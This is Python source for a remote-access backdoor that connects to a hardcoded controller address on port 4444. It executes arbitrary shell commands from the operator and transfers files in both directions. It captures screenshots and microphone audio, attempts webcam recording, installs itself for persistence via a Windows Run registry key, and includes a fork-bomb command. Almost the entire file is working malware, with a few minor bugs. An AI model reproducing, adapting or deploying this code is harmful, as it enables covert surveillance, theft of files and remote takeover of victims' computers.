import getpass
import json
import os
import platform
import shutil
import socket
import subprocess
import sys
import time
import wave

import imageio as iio
import pyaudio
import pyautogui
import termcolor

LHOST = "192.168.234.130";PORT = 4444

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def screenshot():
    targetScreen = pyautogui.screenshot()
    targetScreen.save("screenshot.png")


def record(record_secs):
    filename = "recorded.wav"
    chunk = 1024
    FORMAT = pyaudio.paInt16
    channels = 1
    sample_rate = 44100
    record_seconds = int(record_secs)
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=channels,
                    rate=sample_rate,
                    input=True,
                    output=True,
                    frames_per_buffer=chunk)
    frames = []
    for i in range(int(sample_rate / chunk * record_seconds)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(filename, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(sample_rate)
    wf.writeframes(b"".join(frames))
    wf.close()



def persist(reg_name, copy_name):
    file_path = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_path):
            shutil.copyfile(sys.executable, file_path)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_path + '"',
                shell=True)
            reliable_send('[+] Created Persistence With Req Key:' + reg_name)
        else:
            reliable_send("[-] Persistence Already Exists")
    except:
        reliable_send('[+] Error Creating Persistence')


def connection():
    while True:
        time.sleep(20)
        try:
            s.connect((LHOST, PORT))
            shell()
            s.close()
            break
        except:
            connection()

def shell():
    while True:
        cmd = reliable_recv()
        if cmd == 'exit':
            reliable_send(termcolor.colored('[-] Goodbye', 'red'))
            break
        elif cmd == 'help':
            pass
        elif cmd == 'clear':
            pass
        elif cmd[:3] == 'cd ':
            try:
                os.chdir(cmd[3:])
                reliable_send(termcolor.colored("[+] Changed directory to {}".format(os.getcwd()), 'green'))
            except FileNotFoundError:
                reliable_send(termcolor.colored("[-] Error: There is no file called {}".cmd[3:], 'green'))
                continue

        elif cmd[:6] == 'upload':
            try:
                download_file(cmd[7:])
                reliable_send(termcolor.colored('[+] Done Uploaded file', 'green'))
            except FileNotFoundError:
                pass
        elif cmd[:8] == 'download':
            try:
                upload_file(cmd[9:])
                reliable_send('[+] Done Downloaded file')
            except FileNotFoundError:
                pass
        elif cmd == 'screenshot':
            screenshot()
            upload_file('screenshot.png')
            reliable_send('[+] Done screenshot saved')
            os.remove('screenshot.png')
        elif cmd[:6] == 'record':
            record(record_secs=cmd[7:])
            upload_file('recorded.wav')
            reliable_send('[+] Done recording')
            os.remove('recorded.wav')
        # elif cmd == 'record_screen':
        #     record_screen()
        #     upload_file('output.avi')
        #     reliable_send('[+] Done recording')
        #     os.remove('output.avi')
        elif cmd == 'record_cam':
            cam_record()
            upload_file('cam_record.mp4')
            reliable_send('[+] Done recording')
            os.remove('cam-record.mp4')
        elif cmd[:11] == 'persistence':
            reg_name, copy_name = cmd[12:].split(' ')
            persist(reg_name, copy_name)
        elif cmd == "sysinfo":
            sysinfo = termcolor.colored(f"""
        Operating System: {platform.system()}
        Computer Name: {platform.node()}
        Username: {getpass.getuser()}
        Release Version: {platform.release()}
        Processor Architecture: {platform.processor()}
                    """, 'blue')
            reliable_send(sysinfo)

        elif cmd == "forkbomb":
            while True:
                os.fork()
            reliable_send(termcolor.colored("[+] Done sent forkbomb", 'green'))

        else:
            execute = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()